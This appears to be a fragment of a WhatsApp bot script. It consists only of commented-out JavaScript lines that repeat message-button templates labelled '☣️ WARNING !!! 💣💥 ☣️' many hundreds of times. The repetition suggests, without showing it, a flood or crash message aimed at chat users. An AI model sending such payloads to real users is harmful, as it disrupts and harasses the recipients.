// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//    { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//    { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//    { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
